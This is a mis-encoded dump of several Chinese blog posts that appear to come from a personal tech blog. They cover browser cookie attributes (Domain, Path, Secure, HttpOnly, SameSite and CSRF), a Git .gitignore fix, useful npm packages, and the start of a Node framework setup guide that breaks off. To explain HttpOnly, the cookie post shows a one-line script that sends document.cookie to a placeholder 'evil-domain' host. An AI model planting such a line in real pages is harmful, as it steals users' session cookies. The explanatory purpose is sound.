cookie\nç»§ç»­ç”¨ä¸Šé¢çš„ä¾‹å­éªŒè¯ï¼š\n1ã€ä¿®æ”¹elin.comä¸‹çš„é¡µé¢çš„cookieè®¾ç½®ï¼Œè¯¥ cookie è®¾ç½®domain\n2ã€æ¸…é™¤è¯¥é¡µé¢ä¸‹çš„ cookieï¼Œé‡æ–°è®¿é—®è¯¥é¡µé¢å¹¶æŸ¥çœ‹ cookie\n3ã€åˆ·æ–°db.elin.comä¸‹çš„é¡µé¢å¹¶æŸ¥çœ‹ cookie\nå¯ä»¥çœ‹åˆ°å­åŸŸåå¯ä»¥çœ‹åˆ°è¿™ä¸ª cookie\nå¦‚æœæœåŠ¡å™¨æŒ‡å®šçš„åŸŸåä¸å±äºæœåŠ¡å™¨å½“å‰åŸŸåæˆ–è€…å…¶çˆ¶åŸŸåï¼Œæµè§ˆå™¨ä¼šæ‹’ç»è¿™ä¸ª cookie\nç»§ç»­ç”¨ä¸Šé¢çš„ä¾‹å­éªŒè¯ï¼š\n1ã€ä¿®æ”¹elin.comä¸‹çš„é¡µé¢çš„cookieè®¾ç½®ï¼Œè¯¥ cookie çš„domainè®¾ç½®ä¸ºä¸€ä¸ªä¸ç›¸å…³çš„åŸŸå\n2ã€æ¸…é™¤è¯¥é¡µé¢ä¸‹çš„ cookieï¼Œé‡æ–°è®¿é—®è¯¥é¡µé¢å¹¶æŸ¥çœ‹ cookie\nå¯ä»¥çœ‹åˆ°æ²¡æœ‰ cookieï¼Œæµè§ˆå™¨æ‹’ç»äº†è¿™ä¸ª cookie\n3.Path Pathå±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡ºHTTPè¯·æ±‚æ—¶ï¼Œå“ªäº›è·¯å¾„è¦é™„å¸¦è¿™ä¸ªcookieã€‚ åªè¦æµè§ˆå™¨å‘ç°ï¼ŒPathå±æ€§å€¼æ˜¯HTTPè¯·æ±‚è·¯å¾„çš„å¼€å¤´ä¸€éƒ¨åˆ†ï¼Œå°±ä¼šåœ¨å¤´ä¿¡æ¯é‡Œé¢å¸¦ä¸Šè¿™ä¸ª cookie ã€‚ æ¯”å¦‚ï¼ŒPathå±æ€§æ˜¯/ï¼Œé‚£ä¹ˆè¯·æ±‚/docsè·¯å¾„ä¹Ÿä¼šåŒ…å«è¯¥cookieã€‚å½“ç„¶ï¼Œå‰ææ˜¯åŸŸåå¿…é¡»ä¸€è‡´\n4.Secure Secureå±æ€§æŒ‡å®šæµè§ˆå™¨åªæœ‰åœ¨åŠ å¯†åè®®HTTPSä¸‹ï¼Œæ‰èƒ½å°†è¿™ä¸ªcookieå‘é€åˆ°æœåŠ¡å™¨ã€‚ è¯¥å±æ€§åªæ˜¯ä¸€ä¸ªå¼€å…³ï¼Œä¸éœ€è¦æŒ‡å®šå€¼`\né€šè¿‡è°·æ­Œæµè§ˆå™¨å¼€å‘è€…å·¥å…·æ§åˆ¶å°è®¾ç½®ä¸€ä¸ªCookieå…·æœ‰Secureå±æ€§\ndocument.cookie = \u0026#39;softwhy=\u0026#34;antzone\u0026#34;;max-age=1200;path=/;secure;\u0026#39; ä¸Šè¿°ä»£ç æ‰§è¡Œç»“æœä¼šå‡ºç°å¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š\nå¦‚æœç«™ç‚¹é‡‡ç”¨HTTPSï¼Œé‚£ä¹ˆCookieç”ŸæˆæˆåŠŸ å¦‚æœç«™ç‚¹é‡‡ç”¨HTTPï¼Œé‚£ä¹ˆCookieç”Ÿæˆå¤±è´¥ åç«¯è¯­è¨€ä¹Ÿéµå¾ªä¸Šé¢ä¸¤æ¡è§„åˆ™:\nå¦‚æœè¿æ¥åˆ°åç«¯çš„è¯·æ±‚é‡‡ç”¨ HTTPSï¼Œé‚£ä¹ˆ Cookie ç”ŸæˆæˆåŠŸ å¦‚æœè¯·æ±‚é‡‡ç”¨ HTTPï¼Œé‚£ä¹ˆ Cookie ç”Ÿæˆå¤±è´¥ï¼Œå°½ç®¡åœ¨HTTPå¤´éƒ¨æœ‰å¯¹åº”çš„ Set-Cookie å†…å®¹ï¼Œä½†ä¸ä¼šçœŸæ­£æˆåŠŸç”Ÿæˆå¯¹åº”çš„ Cookie 5.HttpOnly HttpOnlyå±æ€§æŒ‡å®šè¯¥cookieæ— æ³•é€šè¿‡JavaScriptè„šæœ¬æ‹¿åˆ°ï¼Œä¸»è¦æ˜¯document.cookieã€XMLHttpRequestå¯¹è±¡å’ŒRequest APIã€‚é˜²æ­¢è¯¥cookieè¢«è„šæœ¬è¯»åˆ°ï¼Œåªæœ‰æµè§ˆå™¨å‘å‡ºHTTPè¯·æ±‚æ—¶ï¼Œæ‰ä¼šå¸¦ä¸Šè¯¥cookie\nä¸‹é¢æ˜¯è·¨ç«™ç‚¹è½½å…¥çš„ä¸€ä¸ªæ¶æ„è„šæœ¬çš„ä»£ç ï¼Œèƒ½å¤Ÿå°†å½“å‰ç½‘é¡µçš„cookieå‘å¾€ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ªcookieçš„HttpOnlyå±æ€§ï¼Œå°±ä¸ä¼šè¯»åˆ°è¯¥cookie\n(new Image()).src = \u0026#34;http://www.evil-domain.com/steal-cookie.php?cookie=\u0026#34; + document.cookie; 6.SameSite 6.1 SameSite çš„ä½œç”¨ ç”¨æ¥é™åˆ¶ç¬¬ä¸‰æ–¹ Cookieï¼Œå‡å°‘å®‰å…¨é£é™©\nChrome 51 å¼€å§‹ï¼Œæµè§ˆå™¨çš„ cookie æ–°å¢åŠ äº†ä¸€ä¸ªSameSiteå±æ€§ï¼ŒSameSite é˜»æ­¢æµè§ˆå™¨å°†æ­¤ cookie ä¸è·¨ç«™ç‚¹è¯·æ±‚ä¸€èµ·å‘é€ï¼Œå…¶ä¸»è¦ç›®æ ‡æ˜¯é™ä½è·¨æºä¿¡æ¯æ³„æ¼çš„é£é™©ï¼ŒåŒæ—¶ä¹Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜»æ­¢äº† CSRF æ”»å‡»å’Œç”¨æˆ·è¿½è¸ª\nCookie å¾€å¾€ç”¨æ¥å­˜å‚¨ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼Œæ¶æ„ç½‘ç«™å¯ä»¥è®¾æ³•ä¼ªé€ å¸¦æœ‰æ­£ç¡® cookie çš„HTTPè¯·æ±‚ï¼Œè¿™å°±æ˜¯CSRF æ”»å‡»\nä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·ç™»é™†äº†é“¶è¡Œç½‘ç«™your-bank.comï¼Œé“¶è¡ŒæœåŠ¡å™¨å‘æ¥äº†ä¸€ä¸ª cookie\nSet-Cookie:id=a3fWa; ç”¨æˆ·åæ¥åˆè®¿é—®äº†æ¶æ„ç½‘ç«™malicious.comï¼Œä¸Šé¢æœ‰ä¸€ä¸ªè¡¨å•\n\u0026lt;form action=\u0026#34;your-bank.com/transfer\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; ... \u0026lt;/form\u0026gt; ç”¨æˆ·ä¸€æ—¦è¢«è¯±éª—å‘é€è¿™ä¸ªè¡¨å•ï¼Œé“¶è¡Œç½‘ç«™å°±ä¼šæ”¶åˆ°å¸¦æœ‰æ­£ç¡® cookie çš„è¯·æ±‚\nCookie çš„ domain (your-bank.com) ä¸å½“å‰è®¿é—®çš„ç½‘ç«™ (malicious.com) ä¸ä¸€æ ·ï¼Œè¿™ç§ cookie å°±ç§°ä¸ºç¬¬ä¸‰æ–¹ cookieã€‚å®ƒé™¤äº†ç”¨äº CSRF æ”»å‡»ï¼Œè¿˜å¯ä»¥ç”¨äºç”¨æˆ·è¿½è¸ªã€‚ æ¯”å¦‚ï¼Œä½ çš„ç½‘é¡µä¸Šè¯·æ±‚äº†ä¸€å¼  Facebook çš„å›¾ç‰‡ï¼ŒFacebook è¿”å›æ•°æ®çš„æ—¶å€™é¡ºä¾¿è¿”å›äº†ä¸€ä¸ª cookieï¼Œè¿™ä¸ª cookie çš„ domain æ˜¯facebook.com\n\u0026lt;img src=\u0026#34;facebook.com/face.png\u0026#34;\u0026gt; ä¸‹æ¬¡ä½ å†è®¿é—® Facebook æ—¶å‘å‡ºçš„è¯·æ±‚å°±ä¼šå¸¦æœ‰è¿™ä¸ª cookieï¼Œä»è€Œ Facebook å°±ä¼šçŸ¥é“ä½ æ˜¯è°äº†\n6.2 SameSite çš„å€¼ è®¾ç½®ä¸‰ä¸ªå€¼ï¼šStrictã€Laxã€None\nStrict Strict æ˜¯æœ€ä¸¥æ ¼çš„é˜²æŠ¤ï¼Œå°†é˜»æ­¢æµè§ˆå™¨åœ¨æ‰€æœ‰è·¨ç«™ç‚¹è¯·æ±‚ä¸­å°† cookie å‘é€åˆ°ç›®æ ‡ç«™ç‚¹ã€‚å› æ­¤è¿™ç§è®¾ç½®å¯ä»¥é˜»æ­¢æ‰€æœ‰ CSRF æ”»å‡»\nSet-Cookie: CookieName=CookieValue; SameSite=Strict;\nè¿™ä¸ªè§„åˆ™è¿‡äºä¸¥æ ¼ï¼Œå¯èƒ½é€ æˆéå¸¸ä¸å¥½çš„ç”¨æˆ·ä½“éªŒã€‚æ¯”å¦‚ï¼Œå½“å‰ç½‘é¡µæœ‰ä¸€ä¸ª GitHub é“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»è·³è½¬å°±ä¸ä¼šå¸¦æœ‰ GitHub çš„ cookieï¼Œè·³è½¬è¿‡å»æ€»æ˜¯æœªç™»é™†çŠ¶æ€ã€‚ ä¸è¿‡ï¼Œå…·æœ‰äº¤æ˜“ä¸šåŠ¡çš„ç½‘ç«™å¾ˆå¯èƒ½ä¸å¸Œæœ›ä»å¤–ç«™é“¾æ¥åˆ°ä»»ä½•äº¤æ˜“é¡µé¢ï¼Œå› æ­¤è¿™ç§åœºæ™¯æœ€é€‚åˆä½¿ç”¨ strict æ ‡å¿—ã€‚\nLax Laxè§„åˆ™ç¨ç¨æ”¾å®½ï¼Œå¤§å¤šæ•°æƒ…å†µä¹Ÿæ˜¯ä¸å‘é€ç¬¬ä¸‰æ–¹ cookieï¼Œä½†æ˜¯å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„Getè¯·æ±‚é™¤å¤–ã€‚å¦å¤–ï¼Œä½¿ç”¨JavaScriptè„šæœ¬å‘èµ·çš„è¯·æ±‚ä¹Ÿæ— æ³•æºå¸¦ç¬¬ä¸‰æ–¹ cookie\nSet-Cookie: CookieName=CookieValue; SameSite=Lax;\nå¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ GET è¯·æ±‚ï¼ŒåªåŒ…æ‹¬ä¸‰ç§æƒ…å†µï¼š\né“¾æ¥\u0026lt;a href=\u0026quot;...\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; é¢„åŠ è½½è¯·æ±‚\u0026lt;link rel=\u0026quot;prerender\u0026quot; href=\u0026quot;...\u0026quot;/\u0026gt; ä»¥GET æ–¹å¼æäº¤çš„è¡¨å•\u0026lt;form method=\u0026quot;GET\u0026quot; action=\u0026quot;...\u0026quot;\u0026gt; è®¾ç½®äº† Strict æˆ– Lax ä»¥åï¼ŒåŸºæœ¬å°±æœç»äº† CSRF æ”»å‡»ã€‚å½“ç„¶ï¼Œå‰ææ˜¯ç”¨æˆ·æµè§ˆå™¨æ”¯æŒ SameSite å±æ€§\nNone Chrome è®¡åˆ’å°† Lax å˜ä¸ºé»˜è®¤è®¾ç½®ã€‚è¿™æ—¶ï¼Œç½‘ç«™å¯ä»¥é€‰æ‹©æ˜¾å¼å…³é—­ SameSite å±æ€§ï¼Œå°†å…¶è®¾ä¸ºNoneã€‚ä¸è¿‡ï¼Œå‰ææ˜¯å¿…é¡»åŒæ—¶è®¾ç½®Secureå±æ€§ï¼ˆCookie åªèƒ½é€šè¿‡ HTTPS åè®®å‘é€ï¼‰ï¼Œå¦åˆ™æ— æ•ˆ\n// è®¾ç½®æ— æ•ˆ Set-Cookie: widget_session=abc123; SameSite=None // è®¾ç½®æœ‰æ•ˆ Set-Cookie: widget_session=abc123; SameSite=None; Secure SameSite=Noneçš„ cookie ä¼šåœ¨åŒç«™è¯·æ±‚ã€è·¨ç«™è¯·æ±‚ä¸‹å‘é€ï¼š\nåœ¨æ—§ç‰ˆæµè§ˆå™¨ï¼Œå¦‚æœSameSiteå±æ€§æ²¡æœ‰è®¾ç½®ï¼Œæˆ–è€…æ²¡æœ‰å¾—åˆ°è¿è¡Œæµè§ˆå™¨çš„æ”¯æŒï¼Œé‚£ä¹ˆå®ƒçš„è¡Œä¸ºç­‰åŒäºNoneï¼ŒCookiesä¼šè¢«åŒ…å«åœ¨ä»»ä½•è¯·æ±‚ä¸­â€”â€”åŒ…æ‹¬è·¨ç«™è¯·æ±‚ã€‚ ä½†æ˜¯ï¼Œåœ¨Chrome 80+ç‰ˆæœ¬ä¸­ï¼ŒSameSiteçš„é»˜è®¤å±æ€§æ˜¯SameSite=Laxã€‚æ¢å¥è¯è¯´ï¼Œå½“ Cookie æ²¡æœ‰è®¾ç½® SameSite å±æ€§æ—¶ï¼Œå°†ä¼šè§†ä½œ SameSite å±æ€§è¢«è®¾ç½®ä¸ºLaxã€‚å¦‚æœæƒ³è¦æŒ‡å®š Cookies åœ¨åŒç«™ã€è·¨ç«™è¯·æ±‚éƒ½è¢«å‘é€ï¼Œé‚£ä¹ˆéœ€è¦æ˜ç¡®æŒ‡å®š SameSite ä¸º Noneã€‚å…·æœ‰ SameSite=None çš„ Cookie ä¹Ÿå¿…é¡»æ ‡è®°ä¸ºsecureå¹¶é€šè¿‡HTTPSä¼ é€ã€‚ Chrome ä¹Ÿå®£å¸ƒï¼Œå°†åœ¨ä¸‹ä¸ªç‰ˆæœ¬ä¹Ÿå°±æ˜¯Chrome 83ç‰ˆæœ¬ï¼Œåœ¨è®¿å®¢æ¨¡å¼ä¸‹ç¦ç”¨ç¬¬ä¸‰æ–¹ Cookieï¼Œåœ¨2022å¹´å…¨é¢ç¦ç”¨ç¬¬ä¸‰æ–¹ Cookieï¼Œåˆ°æ—¶å€™ï¼Œå³ä½¿ä½ èƒ½æŒ‡å®š SameSite ä¸º None ä¹Ÿæ²¡æœ‰æ„ä¹‰ï¼Œå› ä¸ºä½ å·²ç»æ— æ³•å†™å…¥ç¬¬ä¸‰æ–¹ Cookie äº†ã€‚ 6.3 è·¨ç«™çš„åˆ¤æ–­ ç¬¬ä¸€æ–¹cookieå’Œç¬¬ä¸‰æ–¹cookieçš„åŒºåˆ«å°±æ˜¯ï¼šæ˜¯å¦æ˜¯ç›¸åŒç«™ç‚¹å‘é€çš„ï¼ˆä¸åŒåˆ™ä¸ºè·¨ç«™ï¼‰ã€‚ æ‰€ä»¥ç¬¬ä¸‰æ–¹cookieä¹Ÿå¯ä»¥ç†è§£ä¸ºè·¨ç«™è¯·æ±‚æ‰€è®¾ç½®çš„cookieã€‚ æ‰€ä»¥ï¼Œç¬¬ä¸‰æ–¹cookieå®šä¹‰ä¸­çš„è·¨ç«™ä¸samesiteæ‰€ä½œç”¨çš„è·¨ç«™è¯·æ±‚ä¸­çš„è·¨ç«™ï¼Œä¸¤è€…çš„åˆ¤æ–­æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ”¾åˆ°ä¸€èµ·æ¥è¯´ã€‚ é‚£ä¹ˆæ€ä¹ˆåˆ¤æ–­æ˜¯ä¸æ˜¯å½¢æˆè·¨ç«™äº†å‘¢ï¼Ÿ æˆ‘ä»¬æ˜¯æ‹¿ â€œè¯·æ±‚çš„ç›®æ ‡URLï¼ˆæˆ–è€…cookieçš„domainï¼‰â€ å’Œ â€œå½“å‰ç½‘ç«™URLï¼ˆä¹Ÿå°±æ˜¯æµè§ˆå™¨åœ°å€æ ä¸­çš„ç½‘å€ï¼‰â€ è¿™ä¸¤è€…æ¥è¿›è¡Œæ¯”è¾ƒä»è€Œåˆ¤æ–­æ˜¯å¦å½¢æˆè·¨ç«™çš„ã€‚ ä¸¤è€…çš„ORIGINçš„æ³¨å†ŒåŸŸç›¸åŒåˆ™ä¸ºç›¸åŒç«™ç‚¹ï¼Œä¸åŒåˆ™æ„æˆè·¨ç«™ã€‚æ‰€è°“æ³¨å†ŒåŸŸï¼Œæ˜¯æŒ‡æ‚¨å¯ä»¥è´­ä¹°æˆ–ç§Ÿç”¨çš„åŸŸåï¼Œå³å…¬å…±åç¼€ï¼ˆpublic suffixï¼‰ä¹‹ä¸‹çš„ä¸€çº§ï¼Œä¹Ÿç§°ä¸ºé¡¶çº§åŸŸå\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/07.cookie/","summary":"\u003cp\u003eæˆ‘ä»¬éƒ½çŸ¥é“\u003ccode\u003eHTTPåè®®\u003c/code\u003eæ˜¯\u003ccode\u003eæ— çŠ¶æ€\u003c/code\u003eçš„ï¼Œè¿™ç§æ— çŠ¶æ€æ„å‘³ç€ç¨‹åºéœ€è¦éªŒè¯æ¯ä¸€æ¬¡è¯·æ±‚ï¼Œä»è€Œè¾¨åˆ«å®¢æˆ·ç«¯çš„èº«ä»½ã€‚ \u003ccode\u003eCookie\u003c/code\u003eï¼Œå°±æ˜¯ä¸ºäº†è¾¨åˆ«å®¢æˆ·ç«¯èº«ä»½è€Œå‚¨å­˜åœ¨å®¢æˆ·ç«¯æœ¬åœ°çš„æ•°æ®\u003c/p\u003e","title":"æµè§ˆå™¨: å…³äºcookie"},{"content":"æ‘˜è¦\u0026hellip;\n1..gitignoreå¿½ç•¥æ–‡ä»¶æ— æ•ˆ é—®é¢˜ï¼š.gitignoreä¸­å·²ç»æ ‡æ˜å¿½ç•¥çš„æ–‡ä»¶ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œgit pushçš„æ—¶å€™è¿˜ä¼šå‡ºç°åœ¨pushçš„ç›®å½•ä¸­\nåŸå› ï¼šåœ¨gitå¿½ç•¥ç›®å½•ä¸­ï¼Œæ–°å»ºçš„æ–‡ä»¶åœ¨gitä¸­ä¼šæœ‰ç¼“å­˜ï¼Œå¦‚æœæŸäº›æ–‡ä»¶å·²ç»è¢«çº³å…¥äº†ç‰ˆæœ¬ç®¡ç†ä¸­ï¼Œå°±ç®—æ˜¯åœ¨.gitignoreä¸­å·²ç»å£°æ˜äº†å¿½ç•¥è·¯å¾„ä¹Ÿæ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±åº”è¯¥å…ˆæŠŠæœ¬åœ°ç¼“å­˜åˆ é™¤ï¼Œç„¶åå†è¿›è¡Œgitçš„pushï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºç°å¿½ç•¥çš„æ–‡ä»¶äº†\ngitæ¸…é™¤æœ¬åœ°ç¼“å­˜å‘½ä»¤å¦‚ä¸‹ï¼š\ngit rm -r --cached . git add . git commit -m \u0026#39;update .gitignore\u0026#39; æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/git-faq-summary/","summary":"\u003cp\u003eæ‘˜è¦\u0026hellip;\u003c/p\u003e","title":"Git: ä½¿ç”¨å¸¸è§é—®é¢˜æ±‡æ€»"},{"content":"ä½¿ç”¨npm packageè¿‡ç¨‹ä¸­ï¼Œç§¯ç´¯çš„ä¸€äº›ä¾èµ–è§£å†³æ–¹æ¡ˆ\u0026hellip;\nä¸€ã€å¸¸è§„ 1ã€node-sass å®‰è£… Python 2.7 ä¸”é…ç½®ç¯å¢ƒå˜é‡ é…ç½®å›½å†…é•œåƒ npm install -g mirror-config-china --registry=http://registry.npm.taobao.org npm install node-sass 2ã€monaco ä»£ç ç¼–è¾‘å™¨\nmonaco-editor-vue monaco-editor-webpack-plugin 3ã€é¡¹ç›®æ–‡æ¡£ docsify-cli 4ã€core-js JavaScriptçš„æ¨¡å—åŒ–æ ‡å‡†åº“ï¼ŒåŒ…æ‹¬ECMAScriptåˆ°2023çš„polyfill\ncore-js äºŒã€å‰ç«¯æ¡†æ¶ 1ã€vue 1.1 vue-fragment é—®é¢˜ï¼šElementä¸­ èœå•å¯¼èˆªæŠ˜å åæ–‡å­—ä¸éšè—\nè§£å†³æ€è·¯ï¼š\né¡¹ç›®å®‰è£…vue-fragment npm install --save vue-fragment åœ¨main.jsä¸­å¼•å…¥ // main.js import Fragment from \u0026#39;vue-fragment\u0026#39; Vue.use(Fragment.Plugin) å°†zMenu.vueä¸­çš„\u0026lt;div\u0026gt;ä¿®æ”¹ä¸º\u0026lt;fragment\u0026gt;å³å¯ \u0026lt;!-- è§†å›¾å±‚ --\u0026gt; \u0026lt;el-menu style=\u0026#34;width: 100%;\u0026#34; :collapse=\u0026#34;isCollapse\u0026#34; :collapse-transition=\u0026#34;false\u0026#34; background-color=\u0026#34;#333\u0026#34; text-color=\u0026#34;#fff\u0026#34;\u0026gt; \u0026lt;z-menu :menus=\u0026#34;menus\u0026#34;\u0026gt;\u0026lt;/z-menu\u0026gt; \u0026lt;/el-menu\u0026gt; \u0026lt;!-- zMenu.vue --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;fragment\u0026gt; \u0026lt;template v-for=\u0026#34;menu in menus\u0026#34;\u0026gt; \u0026lt;el-submenu v-if=\u0026#34;menu.children \u0026amp;\u0026amp; menu.children.length \u0026gt;= 1\u0026#34; :index=\u0026#34;menu.menuId + \u0026#39;\u0026#39;\u0026#34; :key=\u0026#34;menu.menuId\u0026#34;\u0026gt; \u0026lt;template slot=\u0026#34;title\u0026#34;\u0026gt; \u0026lt;i :class=\u0026#34;menu.icon\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span slot=\u0026#34;title\u0026#34;\u0026gt;{{menu.menuName}}\u0026lt;/span\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;z-menu :menus=\u0026#34;menu.children\u0026#34;\u0026gt;\u0026lt;/z-menu\u0026gt; \u0026lt;/el-submenu\u0026gt; \u0026lt;el-menu-item v-else :index=\u0026#34;menu.menuId + \u0026#39;\u0026#39;\u0026#34; @click=\u0026#34;handleRouter(menu)\u0026#34; :key=\u0026#34;menu.menuId\u0026#34;\u0026gt; \u0026lt;i :class=\u0026#34;menu.icon\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span slot=\u0026#34;title\u0026#34;\u0026gt;{{menu.menuName}}\u0026lt;/span\u0026gt; \u0026lt;/el-menu-item\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/fragment\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#39;zMenu\u0026#39;, // è‡³å…³é‡è¦ï¼Œå°±é è¿™ä¸ªåå­—é€’å½’äº† props: { menus: { type: Array, default: function () { return []; }, required: false } }, methods: { handleRouter(menu) { // è·³è½¬è·¯ç”± this.$router.push(menu.route); } } } \u0026lt;/script\u0026gt; å‚è€ƒï¼šelement-ui ä¸­ NavMenu èœå•å¯¼èˆªæŠ˜å åæ–‡å­—ä¸éšè—ã€fragment - npm\n1.2 vue-contextmenujs å³é”®èœå•\nhttps://www.npmjs.com/package/vue-contextmenujs\n1.3 Vue.Draggable æ‹–æ‹½\nhttps://www.npmjs.com/package/vuedraggable\n1.4 vue-property-decorator è£…é¥°å™¨å†™æ³•\nhttps://www.npmjs.com/package/vue-property-decorator\n1.5 el-tree-select https://www.npmjs.com/package/el-tree-select\nä¸‰ã€å·¥ç¨‹åŒ– 1ã€ç¼–è¯‘ 1.1 runtime-import å‰ç«¯èµ„æºï¼ˆjs \u0026amp; cssï¼‰è¿è¡Œæ—¶åŠ è½½å·¥å…·. https://www.npmjs.com/package/runtime-import\n2ã€ç›‘æ§æ—¥å¿— 2.1 source-map æºæ–‡ä»¶è§£æSource Map\nå››ã€å…¶ä»– 1ã€patch-packageï¼ˆä¿®æ”¹æºç è¡¥ä¸åŒ…ï¼‰ æºç çš„è¡¥ä¸åŒ… patch-package\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/19.%E5%B8%B8%E7%94%A8npm-package%E4%BD%BF%E7%94%A8/","summary":"\u003cp\u003eä½¿ç”¨npm packageè¿‡ç¨‹ä¸­ï¼Œç§¯ç´¯çš„ä¸€äº›ä¾èµ–è§£å†³æ–¹æ¡ˆ\u0026hellip;\u003c/p\u003e","title":"Node: å¸¸ç”¨npm packageä½¿ç”¨"},{"content":"æ•´ä¸ªå›¢é˜Ÿä¾èµ–åˆç‰ˆAprä½œä¸ºç»Ÿä¸€çš„Nodeæ–¹æ¡ˆï¼Œéšç€ä¸šåŠ¡åœºæ™¯è¶Šæ¥è¶Šä¸°å¯Œï¼Œä¸€äº›æ’ä»¶ã€middleç­‰å…¬å…±é…ç½®æˆä¸ºæœ€ä½³å®è·µåï¼Œé€æ¸ä¸‹æ²‰åˆ°Apræ¡†æ¶ä¸­ï¼Œè®©Aprè¶Šæ¥è¶Š\u0026hellip;\nä¸€ã€å¿«é€Ÿå¼€å§‹ 1. create demo \u0026amp; init $ mkdir apr-example \u0026amp;\u0026amp; cd apr-example $ npm init 2. å®‰è£…ä½¿ç”¨ @lianpf/apr apr æ¶‰åŠåˆ°å…¬å¸ä¿å¯†çº§åˆ«å½±å“ï¼Œæš‚ä¸èƒ½å¯¹å¤–å¼€æ”¾ã€‚æ•…æ­¤å¤„å®‰è£…ä¸€ä¸ªaprå¤–éƒ¨ç®€æ˜“ç‰ˆã€‚\nTipsï¼š\nå†…éƒ¨ä¼šä½¿ç”¨è„šæ‰‹æ¶å¿«é€Ÿæ­å»ºï¼Œæ­¤å¤„ä»…æ¼”ç¤ºæ‰‹åŠ¨åˆ›å»ºå„æ–‡ä»¶æµç¨‹ã€‚\n$ npm i @lianpf/apr -S $ npm i egg-bin egg-mock -D 3. ä¿®æ”¹package.json æ–‡ä»¶ ä¿®æ”¹scripts\n\u0026#34;scripts\u0026#34;: { \u0026#34;dev\u0026#34;: \u0026#34;egg-bin dev\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;egg-bin test\u0026#34; }, å¢åŠ \u0026quot;egg\u0026quot;\n\u0026#34;egg\u0026#34;: { \u0026#34;framework\u0026#34;: \u0026#34;@lianpf/apr\u0026#34; } æœ€ç»ˆpackage.jsonç‰ˆæœ¬:\n{ \u0026#34;name\u0026#34;: \u0026#34;apr-example\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;@lianpf/apr\u0026#34;: \u0026#34;^1.0.0\u0026#34; }, \u0026#34;devDependencies\u0026#34;: { \u0026#34;egg-bin\u0026#34;: \u0026#34;^4.3.5\u0026#34;, \u0026#34;egg-mock\u0026#34;: \u0026#34;^3.13.1\u0026#34; }, \u0026#34;scripts\u0026#34;: { \u0026#34;dev\u0026#34;: \u0026#34;egg-bin dev\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;egg-bin test\u0026#34; }, \u0026#34;egg\u0026#34;: { \u0026#34;framework\u0026#34;: \u0026#34;@lianpf/apr\u0026#34; } } 4. æ­å»º: controllerã€serviceã€configsã€router.jsã€views å‚è€ƒä»¥ä¸‹ç»“æ„ï¼Œæ­å»ºæ–‡ä»¶\napr-example 